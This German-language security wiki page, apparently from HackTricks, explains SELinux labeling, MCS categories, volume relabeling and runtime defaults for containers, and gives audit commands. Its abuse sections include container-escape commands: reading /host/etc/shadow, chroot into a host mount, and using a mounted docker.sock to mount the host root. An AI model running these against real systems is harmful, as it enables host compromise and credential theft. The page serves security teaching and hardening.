# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Überblick

SELinux ist ein **label-basiertes Mandatory Access Control**-System. Jeder relevante Prozess und jedes relevante Objekt kann einen Sicherheitskontext tragen, und die Policy entscheidet, welche Domains mit welchen Typen und auf welche Weise interagieren dürfen. In containerisierten Umgebungen bedeutet dies normalerweise, dass die Runtime den Containerprozess innerhalb einer eingeschränkten Container-Domain startet und den Containerinhalt mit entsprechenden Typen labelt. Wenn die Policy ordnungsgemäß funktioniert, kann der Prozess möglicherweise die Dinge lesen und schreiben, mit denen sein Label erwartungsgemäß interagieren darf, während der Zugriff auf andere Host-Inhalte verweigert wird, selbst wenn diese Inhalte durch einen Mount sichtbar werden.

Dies ist eine der leistungsfähigsten hostseitigen Schutzmaßnahmen, die in gängigen Linux-Container-Bereitstellungen verfügbar sind. Sie ist besonders wichtig auf Fedora, RHEL, CentOS Stream, OpenShift und anderen SELinux-zentrierten Ökosystemen. In diesen Umgebungen wird ein Reviewer, der SELinux ignoriert, häufig missverstehen, warum ein offensichtlich wirkender Pfad zur Kompromittierung des Hosts tatsächlich blockiert ist.

## AppArmor vs. SELinux

Der einfachste Unterschied auf hoher Ebene besteht darin, dass AppArmor pfadbasiert ist, während SELinux **label-basiert** ist. Das hat erhebliche Auswirkungen auf die Container-Sicherheit. Eine pfadbasierte Policy kann sich anders verhalten, wenn derselbe Host-Inhalt unter einem unerwarteten Mount-Pfad sichtbar wird. Eine label-basierte Policy fragt stattdessen, welches Label das Objekt besitzt und was die Prozess-Domain damit tun darf. Das macht SELinux nicht einfach, aber es macht das System robust gegenüber einer Klasse von Annahmen über Pfad-Tricks, die Defender in AppArmor-basierten Systemen manchmal unbeabsichtigt treffen.

Da das Modell label-orientiert ist, sind die Handhabung von Container-Volumes und Entscheidungen zum Relabeling sicherheitskritisch. Wenn die Runtime oder der Operator Labels zu weitreichend ändert, um „Mounts funktionsfähig zu machen“, kann die Policy-Grenze, die den Workload isolieren sollte, deutlich schwächer werden als beabsichtigt.

## Lab

Um festzustellen, ob SELinux auf dem Host aktiv ist:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Um vorhandene Labels auf dem Host zu untersuchen:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Um einen normalen Lauf mit einem zu vergleichen, bei dem die Kennzeichnung deaktiviert ist:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
Auf einem SELinux-aktivierten Host ist dies eine sehr praxisnahe Demonstration, da sie den Unterschied zwischen einer Workload zeigt, die unter der erwarteten Container-Domain läuft, und einer, der diese Durchsetzungsebene entzogen wurde.

## Laufzeitnutzung

Podman ist auf Systemen, auf denen SELinux Bestandteil der Plattformstandardkonfiguration ist, besonders gut auf SELinux abgestimmt. Rootless Podman plus SELinux ist eine der stärksten verbreiteten Container-Baselines, da der Prozess auf der Host-Seite bereits unprivilegiert ist und weiterhin durch eine MAC policy eingeschränkt wird. Docker kann SELinux ebenfalls verwenden, sofern dies unterstützt wird, auch wenn Administratoren es manchmal deaktivieren, um Probleme bei der Volume-Kennzeichnung zu umgehen. CRI-O und OpenShift stützen sich im Rahmen ihrer Container-Isolationsstrategie stark auf SELinux. Kubernetes kann ebenfalls SELinux-bezogene Einstellungen bereitstellen, deren Nutzen jedoch offensichtlich davon abhängt, ob das Betriebssystem des Nodes SELinux tatsächlich unterstützt und durchsetzt.<sup>[[2]](#references)</sup>

Die wiederkehrende Erkenntnis ist, dass SELinux kein optionales Extra ist. In den darauf aufbauenden Ökosystemen ist es Bestandteil der erwarteten Sicherheitsgrenze. Informationen zur Aufzählung von Host-seitigen Policies, zur Analyse von Transitions und zum Missbrauch von SELinux-Administrationstools findest du auf der [allgemeinen SELinux-Seite](../../../interesting-files-permissions/selinux.md).

## MCS-Kategorien und Volume-Neukennzeichnung

Die Container-Isolation besteht normalerweise aus einer Kombination von **Type Enforcement** und **Multi-Category Security (MCS)**. Zwei Prozesse können beide als `container_t` ausgeführt werden, aber unterschiedliche Levels wie `s0:c123,c456` und `s0:c321,c654` erhalten. Private Container-Inhalte werden mit `container_file_t` und den passenden Kategorien gekennzeichnet, sodass das bloße Erreichen des Pfads eines anderen Containers nicht ausreicht, um darauf zuzugreifen. Runtimes weisen das Kategorienpaar normalerweise automatisch zu; das manuelle Wiederverwenden eines Levels hebt diese Trennung pro Container absichtlich auf.<sup>[[3]](#references)</sup>

Vergleiche die Prozess- und Mount-Labels, anstatt nur den Typ zu überprüfen:<sup>[[3]](#references)</sup>
```bash
podman inspect --format 'process={{.ProcessLabel}} mount={{.MountLabel}}' <container>
podman top <container> label
ps -eZ | grep -E 'container_t|spc_t'
ls -Zd /path/to/bind-mount
```
Bind-Mount-Suffixe ändern die Inode-Labels des Hosts und damit die Sicherheitsgrenze, nicht nur die Mount-Metadaten:<sup>[[3]](#references)</sup>

- `:Z` weist ein privates Label mit den MCS-Kategorien des Containers zu. Es eignet sich für ein Volume, das einem einzelnen Container oder Pod gehört.
- `:z` weist ein gemeinsam verwendetes Label zu, sodass auch andere eingeschränkte Container den Inhalt verwenden können (vorbehaltlich der DAC-Berechtigungen). Die Verwendung für Secrets oder mandantenspezifische Daten hebt die MCS-Isolation auf, die Container andernfalls voneinander trennen würde.
- Das erneute Labeln erfolgt rekursiv. Die Anwendung einer der beiden Optionen auf umfangreiche Host-Verzeichnisbäume wie `/`, `/etc`, `/usr` oder einen gesamten Home-Verzeichnisbaum kann sowohl Inhalte für den ausgewählten Container freigeben als auch Host-Dienste anhalten, deren erwartete Labels ersetzt wurden.

Die manuelle Wiederverwendung von Levels ist in Befehlszeilen und Manifests leicht zu erkennen. Die folgenden beiden Container erhalten absichtlich dasselbe MCS-Level und können daher auf Inhalte zugreifen, die für dieses Level gelabelt sind:<sup>[[3]](#references)</sup>
```bash
podman run --security-opt label=level:s0:c100,c200 ...
podman run --security-opt label=level:s0:c100,c200 ...
```
Unterscheide außerdem `label=nested` von `label=disable`: Ersteres macht SELinux-Operationen innerhalb des Containers sichtbar und erlaubt Label-Änderungen nur dort, wo die Policy dies zulässt, während Letzteres die Label-Trennung für diesen Workload aufhebt. Beide verdienen eine Überprüfung, sind jedoch nicht gleichbedeutend.<sup>[[3]](#references)</sup>

## Fehlkonfigurationen

Der klassische Fehler ist `label=disable`. In der Praxis geschieht dies häufig, weil ein Volume-Mount verweigert wurde und die schnellste kurzfristige Lösung darin bestand, SELinux aus der Gleichung zu entfernen, anstatt das Labeling-Modell zu korrigieren.<sup>[[1]](#references)</sup> Ein weiterer häufiger Fehler ist das inkorrekte Relabeling von Host-Inhalten. Umfassende Relabeling-Operationen können die Anwendung zwar zum Laufen bringen, aber sie können auch den Bereich, auf den der Container zugreifen darf, weit über das ursprünglich Beabsichtigte hinaus erweitern.

Es ist außerdem wichtig, **installiertes** SELinux nicht mit **effektivem** SELinux zu verwechseln. Ein Host kann SELinux unterstützen und sich dennoch im permissiven Modus befinden, oder die Runtime startet den Workload möglicherweise nicht unter der erwarteten Domain. In diesen Fällen ist der Schutz deutlich schwächer, als es die Dokumentation vermuten lässt.

## Missbrauch

Wenn SELinux für den Workload fehlt, sich im permissiven Modus befindet oder weitgehend deaktiviert ist, lassen sich auf dem Host gemountete Pfade wesentlich leichter missbrauchen. Derselbe Bind-Mount, der andernfalls durch Labels eingeschränkt wäre, kann zu einem direkten Weg zu Host-Daten oder Host-Änderungen werden. Dies ist besonders relevant in Kombination mit beschreibbaren Volume-Mounts, Verzeichnissen der Container-Runtime oder betrieblichen Abkürzungen, durch die aus Bequemlichkeit sensible Host-Pfade offengelegt wurden.

SELinux erklärt häufig, warum ein allgemeines Breakout-Writeup auf einem Host sofort funktioniert, auf einem anderen jedoch wiederholt fehlschlägt, obwohl die Runtime-Flags ähnlich aussehen. Die fehlende Komponente ist oft weder ein Namespace noch eine Capability, sondern eine Label-Grenze, die intakt geblieben ist.

Die schnellste praktische Prüfung besteht darin, den aktiven Kontext zu vergleichen und anschließend gemountete Host-Pfade oder Runtime-Verzeichnisse zu untersuchen, die normalerweise durch Labels eingeschränkt wären:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Wenn ein Host-Bind-Mount vorhanden ist und das SELinux-Labeling deaktiviert oder abgeschwächt wurde, kommt es häufig zuerst zur Offenlegung von Informationen:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Wenn der Mount beschreibbar ist und der Container aus Sicht des Kernels effektiv über Host-Root-Rechte verfügt, besteht der nächste Schritt darin, eine kontrollierte Änderung am Host zu testen, anstatt zu raten:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
Auf SELinux-fähigen Hosts kann der Verlust von Labels rund um Verzeichnisse für den Laufzeitstatus auch direkte Wege zur Rechteausweitung eröffnen:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Diese Befehle ersetzen keine vollständige escape chain, machen jedoch sehr schnell deutlich, ob SELinux den Zugriff auf Host-Daten oder die Änderung von Dateien auf dem Host verhindert hat.

### Vollständiges Beispiel: SELinux deaktiviert + beschreibbarer Host-Mount

Wenn SELinux labeling deaktiviert ist und das Host-Dateisystem unter `/host` beschreibbar gemountet wird, wird ein vollständiger host escape zu einem normalen bind-mount abuse case:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Wenn `chroot` erfolgreich ist, arbeitet der Container-Prozess nun vom Host-Dateisystem aus:
```bash
id
hostname
cat /etc/passwd | tail
```
### Vollständiges Beispiel: SELinux deaktiviert + Laufzeitverzeichnis

Wenn der Workload nach der Deaktivierung der Labels einen Runtime-Socket erreichen kann, kann der Escape an die Runtime delegiert werden:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
Die relevante Beobachtung ist, dass SELinux häufig die Kontrolle war, die genau diese Art des Zugriffs auf Host-Pfade oder den Laufzeitstatus verhinderte.

## Prüfungen

Das Ziel der SELinux-Prüfungen besteht darin, zu bestätigen, dass SELinux aktiviert ist, den aktuellen Sicherheitskontext zu ermitteln und festzustellen, ob die Dateien oder Pfade, die dich interessieren, tatsächlich durch Labels eingeschränkt sind.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
Was ist hier interessant:

- `getenforce` sollte idealerweise `Enforcing` zurückgeben; `Permissive` oder `Disabled` verändert die Bedeutung des gesamten SELinux-Abschnitts.
- Wenn der Kontext des aktuellen Prozesses unerwartet oder zu weitreichend wirkt, läuft der Workload möglicherweise nicht unter der vorgesehenen Container-Policy.
- Wenn auf dem Host eingebundene Dateien oder Runtime-Verzeichnisse Labels haben, auf die der Prozess zu frei zugreifen kann, werden Bind-Mounts deutlich gefährlicher.

Bei der Überprüfung eines Containers auf einer SELinux-fähigen Plattform sollte Labeling nicht als nebensächliches Detail betrachtet werden. In vielen Fällen ist es einer der Hauptgründe, warum der Host noch nicht kompromittiert wurde.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Host-dependent | SELinux separation is available on SELinux-enabled hosts, but the exact behavior depends on host/daemon configuration | `--security-opt label=disable`, broad relabeling of bind mounts, `--privileged` |
| Podman | Commonly enabled on SELinux hosts | SELinux separation is a normal part of Podman on SELinux systems unless disabled | `--security-opt label=disable`, `label=false` in `containers.conf`, `--privileged` |
| Kubernetes | Runtime-assigned on SELinux nodes; explicitly configurable | The runtime can allocate a unique label when the Pod does not set one. Explicit `securityContext.seLinuxOptions` controls the Pod/volume label; on Kubernetes 1.37, eligible volumes use SELinux mount labeling by default | duplicated MCS levels, permissive/disabled nodes, broad privileged workloads, indiscriminate `seLinuxChangePolicy: Recursive` <sup>[[2]](#references)[[4]](#references)</sup> |
| CRI-O / OpenShift style deployments | Commonly relied on heavily | SELinux is often a core part of the node isolation model in these environments | custom policies that over-broaden access, disabling labeling for compatibility |

SELinux-Standardeinstellungen hängen stärker von der Distribution ab als seccomp-Standardeinstellungen. Auf Fedora/RHEL/OpenShift-ähnlichen Systemen ist SELinux häufig ein zentraler Bestandteil des Isolationsmodells. Auf Nicht-SELinux-Systemen ist es schlicht nicht vorhanden.

## Kubernetes 1.37 Volume Labeling

Kubernetes 1.37 hat `SELinuxMount` als stabil eingestuft und standardmäßig aktiviert. Für eine geeignete PVC, einen Pod mit `seLinuxOptions` und einen CSI-Treiber, der `.spec.seLinuxMount: true` ankündigt, verwendet kubelet `-o context=<label>`, anstatt die Runtime aufzufordern, jeden Inode rekursiv neu zu labeln. Nicht unterstützte Treiber und Volume-Typen verwenden weiterhin den rekursiven Pfad. Dadurch wird ein umfangreicher Relabeling-Durchlauf vermieden. Außerdem werden die persistenten Labels aller Dateien nicht mehr geändert, nur um das Volume für einen Pod bereitzustellen.<sup>[[2]](#references)[[4]](#references)</sup>

Ein Mount kann nur einen solchen Kontext tragen. Daher können Pods mit **unterschiedlichen SELinux-Labels**, die dasselbe geeignete Volume auf demselben Node verwenden, unter dem standardmäßigen `MountOption`-Verhalten nicht mehr koexistieren: Einer verbleibt mit dem Fehler `conflicting SELinux labels of volume` in `ContainerCreating`. Betrachte dies sowohl als Verfügbarkeitsproblem als auch als nützlichen Hinweis darauf, dass Workloads implizit Storage über MCS-Grenzen hinweg gemeinsam verwendet haben. Wenn diese gemeinsame Nutzung beabsichtigt ist – beispielsweise bei einem privilegierten `spc_t`-Pod und einem eingeschränkten Pod, die dasselbe Volume verwenden –, lautet der podbezogene Kompatibilitäts-Workaround `seLinuxChangePolicy: Recursive`; wende ihn nicht clusterweit an, ohne zu verstehen, welche Pfade die Runtime neu labeln wird.<sup>[[2]](#references)[[4]](#references)</sup>
```yaml
spec:
securityContext:
seLinuxOptions:
level: "s0:c123,c456"
seLinuxChangePolicy: Recursive
```
Nützliche clusterseitige Prüfungen:<sup>[[2]](#references)</sup>
```bash
# Drivers that opt in to -o context= volume mounts
kubectl get csidriver -o custom-columns=NAME:.metadata.name,SELINUX_MOUNT:.spec.seLinuxMount

# Explicit levels or recursive-policy exceptions
kubectl get pods -A -o json | jq -r '
.items[] |
select(.spec.securityContext.seLinuxOptions or
.spec.securityContext.seLinuxChangePolicy) |
[.metadata.namespace,.metadata.name,
(.spec.securityContext.seLinuxOptions.level // "-"),
(.spec.securityContext.seLinuxChangePolicy // "MountOption")] | @tsv'

# Start failures and warnings caused by incompatible labels
kubectl get events -A --sort-by=.lastTimestamp |
grep -Ei 'SELinux|conflicting SELinux labels'
```
Der optionale `selinux-warning-controller` des `kube-controller-manager` erkennt Pods, die ein Volume mit inkompatiblen Labels gemeinsam verwenden, und stellt die Metrik `selinux_warning_controller_selinux_volume_conflict` bereit. Aktiviere und überprüfe ihn vor Upgrades oder bevor du das Verhalten bei Volume-Labels änderst; er hilft dabei, einen echten Policy-Konflikt von einem gewöhnlichen CSI- oder Dateisystemfehler zu unterscheiden.<sup>[[2]](#references)</sup>

## References

- [1] [Podman-Dokumentation: --security-opt=option (label=disable)](https://docs.podman.io/en/v4.6.0/markdown/options/security-opt.html)
- [2] [Kubernetes: Einen Security Context für einen Pod oder Container konfigurieren](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [3] [Podman-run-Dokumentation: SELinux-Labels und Volume-Relabeling](https://docs.podman.io/en/latest/markdown/podman-run.1.html)
- [4] [Kubernetes-v1.37-Release: SELinuxMount und SELinuxChangePolicy](https://kubernetes.io/blog/2026/08/26/kubernetes-v1-37-release/)
{{#include ../../../../banners/hacktricks-training.md}}
